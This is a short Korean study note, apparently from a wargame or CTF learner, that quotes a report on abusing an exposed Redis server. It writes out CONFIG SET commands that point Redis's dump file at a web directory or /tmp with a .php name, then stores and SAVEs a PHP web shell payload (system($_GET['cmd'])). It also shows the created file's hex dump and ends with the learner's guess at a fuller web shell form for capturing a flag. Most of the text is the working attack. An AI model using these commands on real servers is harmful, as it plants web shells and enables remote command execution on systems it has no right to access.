핵심은 파일을 어떻게 저장하고 다시 불러오느냐 하는 점이다 
이 문제의 핵심은 바로 이것이다 

CONFIG SET appendonly yes
CONFIG SET dir /var/www/html/data
CONFIG SET dbfilename index.php
SET <?php system($_GET['cmd']); ?> webshell
(굉장히 깊이가 있는 매우 중요한 단서)

Figure 17. SAVE 명령어를 통한 웹셸 삽입

CONFIG set dir /tmp
CONFIG set dbfilename redis.php
SET test "<?php system($_GET['cmd']); ?>"
SAVE  (그럼 이 save가 워게임으로 치면 save 설정을 눌렀다는 의미로 봐도 되는 건가?) 

Figure17은 파일 저장 경로를 “/tmp”, 파일 이름을 “redis.php”로 지정하고 셸을 실행하는 PHP 코드를 저장합니다. 
해당 명령어가 실행되면 Figure18과 같이 성공적으로 파일이 생성되며 공격자는 이를 통해 PHP 등의 다른 애플리
케이션과 연계해 공격을 수행할 수 있습니다.

Figure 18. SAVE 명령어를 통한 웹셸 삽입 결과

$ ls -al redis.php 
-rw-rw---- 1 redis redis 57 May 17 16:59 redis.php
$ xxd redis.php 
00000000: 5245 4449 5330 3030 36fe 0000 0474 6573  REDIS0006....tes
00000010: 741e 3c3f 7068 7020 7379 7374 656d 2824  t.<?php system($
00000020: 5f47 4554 5b27 636d 6427 5d29 3b20 3f3e  _GET['cmd']); ?>
00000030: ffef 0fe2 9f24 c9b8 a3                   .....$...


내 추측인데 위에 맨 처음 핵심에 설명한 것처럼 config로 기본 설정 깔고 
SET <?php system($_GET['cmd']); ?> <?php echo 'Enter a Command:<br>'; echo '<form action="">'; echo '<input type=text name="cmd">'; echo '<input type="submit">'; echo '</form>';
대충 이렇게 넣은 다음 명령어 실행시켜서 flag값을 얻는 게 아닐까? 
